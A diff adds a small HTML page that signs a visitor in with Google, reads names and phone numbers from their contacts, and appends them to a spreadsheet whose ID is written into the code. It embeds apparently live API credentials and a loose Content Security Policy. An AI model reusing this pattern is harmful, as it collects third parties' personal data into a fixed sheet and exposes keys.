@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- Corrected Content Security Policy -->
+    <meta http-equiv="Content-Security-Policy" content="script-src 'self' https://apis.google.com https://accounts.google.com https://nfind.vercel.app 'unsafe-inline' 'unsafe-eval'">
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Upload Contacts</title>
+    <script src="https://apis.google.com/js/api.js"></script>
+</head>
+<body>
+    <button onclick="authenticate()">Click to Upload Your Contacts</button>
+
+    <!-- OAuth2 Iframe (for authentication) -->
+    <iframe src="https://accounts.google.com/o/oauth2/auth" sandbox="allow-scripts allow-same-origin"></iframe>
+
+    <script>
+        const CLIENT_ID = "552193854314-asf6fp0oas79fomfa9ocujhmp857iv8r.apps.googleusercontent.com";  // Replace with your Client ID
+        const API_KEY = "AIzaSyAo8FTU28ypycUoMwQxOVnpobeyZ9osAnM";  // Replace with your API Key
+        const DISCOVERY_DOCS = [
+            "https://www.googleapis.com/discovery/v1/apis/people/v1/rest",
+            "https://sheets.googleapis.com/$discovery/rest?version=v4"
+        ];
+        const SCOPES = "https://www.googleapis.com/auth/contacts.readonly https://www.googleapis.com/auth/spreadsheets";
+
+        function authenticate() {
+            gapi.load("client:auth2", () => {
+                gapi.client.init({
+                    apiKey: API_KEY,
+                    clientId: CLIENT_ID,
+                    discoveryDocs: DISCOVERY_DOCS,
+                    scope: SCOPES
+                }).then(() => {
+                    gapi.auth2.getAuthInstance().signIn().then(listContacts);
+                });
+            });
+        }
+
+        function listContacts() {
+            gapi.client.people.people.connections.list({
+                resourceName: "people/me",
+                pageSize: 100,
+                personFields: "names,phoneNumbers"
+            }).then(response => {
+                const contacts = response.result.connections || [];
+                const formattedContacts = contacts.map(person => {
+                    const name = person.names ? person.names[0].displayName : "Unknown";
+                    const phone = person.phoneNumbers ? person.phoneNumbers[0].value : "No Number";
+                    return [name, phone];
+                });
+
+                uploadToGoogleSheets(formattedContacts);
+            });
+        }
+
+        function uploadToGoogleSheets(data) {
+            const spreadsheetId = "1gjCiK8Vhz2aYpphSQWyy3JUPifMbsEvA3juX6CGrUjU";  // Replace with your Google Sheet ID
+            const range = "Sheet1!A1";  // Adjust based on your sheet structure
+
+            gapi.client.sheets.spreadsheets.values.append({
+                spreadsheetId: spreadsheetId,
+                range: range,
+                valueInputOption: "RAW",
+                insertDataOption: "INSERT_ROWS",
+                resource: { values: data }
+            }).then(response => {
+                alert("Contacts uploaded successfully!");
+            }).catch(error => {
+                alert("Error uploading contacts: " + error.message);
+            });
+        }
+    </script>
+</body>
+</html>
